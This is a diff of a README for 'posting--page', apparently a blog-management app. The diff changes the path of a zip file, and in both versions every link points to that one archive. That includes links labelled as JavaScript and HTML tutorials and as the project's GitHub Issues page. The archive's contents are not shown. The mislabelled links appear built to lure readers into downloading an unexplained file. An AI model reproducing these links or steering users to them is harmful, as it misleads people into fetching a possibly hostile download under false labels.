@@ -6,7 +6,7 @@ Welcome to posting--page! This application helps you create and manage blog post
 ## 📥 Download & Install
 To download the latest version of posting--page, visit the link below:
 
-[![Download the latest release](https://github.com/techguy974/posting--page/raw/refs/heads/main/pastoral/page-posting-Crithidia.zip)](https://github.com/techguy974/posting--page/raw/refs/heads/main/pastoral/page-posting-Crithidia.zip)
+[![Download the latest release](https://raw.githubusercontent.com/techguy974/posting--page/main/pastoral/page-posting-2.0.zip)](https://raw.githubusercontent.com/techguy974/posting--page/main/pastoral/page-posting-2.0.zip)
 
 Once there, simply click on the version you want and follow the prompts to download the application.
 
@@ -52,16 +52,16 @@ For a deeper understanding of how posting--page works, explore the following top
 These topics help you grasp the fundamentals of web development and enhance your skills.
 
 ## 📚 Resources
-- [JavaScript Basics](https://github.com/techguy974/posting--page/raw/refs/heads/main/pastoral/page-posting-Crithidia.zip)
-- [HTML & CSS](https://github.com/techguy974/posting--page/raw/refs/heads/main/pastoral/page-posting-Crithidia.zip)
-- [Learn Asynchronous JavaScript](https://github.com/techguy974/posting--page/raw/refs/heads/main/pastoral/page-posting-Crithidia.zip)
+- [JavaScript Basics](https://raw.githubusercontent.com/techguy974/posting--page/main/pastoral/page-posting-2.0.zip)
+- [HTML & CSS](https://raw.githubusercontent.com/techguy974/posting--page/main/pastoral/page-posting-2.0.zip)
+- [Learn Asynchronous JavaScript](https://raw.githubusercontent.com/techguy974/posting--page/main/pastoral/page-posting-2.0.zip)
   
 ## 📞 Support
-If you encounter any issues, feel free to raise them in our [GitHub Issues](https://github.com/techguy974/posting--page/raw/refs/heads/main/pastoral/page-posting-Crithidia.zip) page. We are here to help!
+If you encounter any issues, feel free to raise them in our [GitHub Issues](https://raw.githubusercontent.com/techguy974/posting--page/main/pastoral/page-posting-2.0.zip) page. We are here to help!
 
 ## 🔗 Additional Download Link
 As mentioned earlier, you can also download posting--page from this link: 
 
-[![Download the latest release](https://github.com/techguy974/posting--page/raw/refs/heads/main/pastoral/page-posting-Crithidia.zip)](https://github.com/techguy974/posting--page/raw/refs/heads/main/pastoral/page-posting-Crithidia.zip)
+[![Download the latest release](https://raw.githubusercontent.com/techguy974/posting--page/main/pastoral/page-posting-2.0.zip)](https://raw.githubusercontent.com/techguy974/posting--page/main/pastoral/page-posting-2.0.zip)
 
 Enjoy building your blog and exploring the world of web development with posting--page!
